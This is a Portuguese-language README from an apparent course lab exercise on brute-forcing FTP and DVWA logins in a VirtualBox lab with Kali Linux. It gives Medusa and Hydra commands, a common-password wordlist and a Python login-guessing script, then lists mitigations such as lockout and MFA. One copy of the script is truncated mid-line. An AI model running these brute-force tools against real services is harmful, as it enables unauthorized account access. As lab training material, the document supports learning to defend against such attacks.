# Ciberseguranca
# 🔐 Projeto de Teste de Força Bruta com Kali Linux e Medusa

## 🎯 Objetivo
Simular ataques de força bruta em serviços vulneráveis (FTP, DVWA, SMB) usando Kali Linux e Medusa, documentando os testes e propondo medidas de mitigação.

## 🖥️ Ambiente
- **Atacante**: Kali Linux
- **Alvo**: Metasploitable 2 + DVWA
- **Rede**: Host-only no VirtualBox

## ⚙️ Ferramentas Utilizadas
- Medusa
- Hydra
- Enum4linux
- DVWA (Damn Vulnerable Web Application)
- Wordlists personalizadas
- Scripts em Python para automação

## 🧪 Testes Realizados

### 1. Ataque FTP com Medusa
```bash
medusa -h 192.168.56.101 -u admin -P wordlist.txt -M ftp

2. Ataque Web (DVWA) com Hydra
hydra -l admin -P wordlist.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"

3. Password Spraying em SMB

🧠 Wordlist Personalizada
Arquivo  com senhas comuns e variações:
• 	admin
• 	admin123
• 	senha
• 	Senha123
- 123456
- qwerty
- kali2023
- metasploit
- root
- toor

🤖 Script de Automação (Python)
Automatiza tentativas de login via DVWA:
import requests

url = "http://192.168.56.101/dvwa/login.php"
wordlist = ["admin", "admin123", "senha", "Senha123", "123456"]

for senha in wordlist:
    payload = {"username": "admin", "password": senha}
    response = requests.post(url, data=payload)
    if "Login failed" not

🛡️ Recomendações de Mitigação
- Bloqueio após múltiplas tentativas
- Autenticação multifator (MFA)
- Monitoramento de logs
- Políticas de senha forte
📸 Evidências
Capturas de tela organizadas na pasta /images.
📂 Arquivos
- wordlist.txt
- users.txt
- automacao_dvwa.py
🚀 Autor
EMERSON – Desafio DIO Cybersecurity

---

## 📄 2. Wordlist personalizada (`wordlist.txt`)


admin admin123 senha Senha123 123456 qwerty kali2023 metasploit root toor

---

## 🐍 3. Script de automação para DVWA (`automacao_dvwa.py`)

```python
import requests

url = "http://192.168.56.101/dvwa/login.php"
wordlist = ["admin", "admin123", "senha", "Senha123", "123456", "qwerty", "kali2023", "metasploit", "root", "toor"]

for senha in wordlist:
    payload = {"username": "admin", "password": senha}
    response = requests.post(url, data=payload)
    if "Login failed" not in response.text:
        print(f"[+] Senha encontrada: {senha}")
        break
    else:
        print(f"[-] Tentativa com {senha} falhou.")







 

